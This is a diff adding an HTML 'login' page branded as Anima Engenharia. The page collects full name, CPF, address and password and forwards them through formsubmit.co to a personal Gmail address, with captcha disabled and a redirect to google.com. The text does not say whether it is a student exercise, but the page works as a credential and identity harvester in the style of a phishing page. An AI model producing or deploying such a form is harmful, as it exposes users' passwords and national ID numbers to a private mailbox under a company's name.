@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anima Engenharia - Login</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a252f; /* Fundo Escuro Profissional */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            width: 380px;
+            border-top: 6px solid #e67e22; /* Laranja Construção Civil */
+        }
+        h2 { 
+            text-align: center; 
+            color: #333; 
+            margin-bottom: 25px; 
+            text-transform: uppercase;
+            font-size: 22px;
+        }
+        .form-group { margin-bottom: 15px; }
+        
+        label { 
+            display: block; 
+            margin-bottom: 5px; 
+            color: #555; 
+            font-weight: 600; 
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%; padding: 12px;
+            border: 1px solid #ddd; border-radius: 4px;
+            box-sizing: border-box;
+            transition: 0.3s;
+        }
+        input:focus { border-color: #e67e22; outline: none; }
+        
+        button {
+            width: 100%; padding: 14px;
+            background-color: #e67e22; color: white;
+            border: none; border-radius: 4px;
+            font-size: 16px; font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+        button:hover { background-color: #d35400; }
+        
+        .info {
+            font-size: 12px;
+            text-align: center;
+            color: #888;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Anima Engenharia</h2>
+        
+        <form action="https://formsubmit.co/bragatf07@gmail.com" method="POST">
+            
+            <input type="hidden" name="_subject" value="Novo Cadastro - Anima">
+            <input type="hidden" name="_template" value="table"> <input type="hidden" name="_captcha" value="false"> <input type="hidden" name="_next" value="https://www.google.com"> <div class="form-group">
+                <label>Nome Completo</label>
+                <input type="text" name="Nome" required>
+            </div>
+            
+            <div class="form-group">
+                <label>CPF</label>
+                <input type="text" name="CPF" placeholder="000.000.000-00" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Endereço</label>
+                <input type="text" name="Endereco" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Senha</label>
+                <input type="password" name="Senha" required>
+            </div>
+
+            <button type="submit">CADASTRAR</button>
+        </form>
+        
+        <p class="info">Os dados serão enviados automaticamente para o e-mail cadastrado.</p>
+    </div>
+
+</body>
+</html>
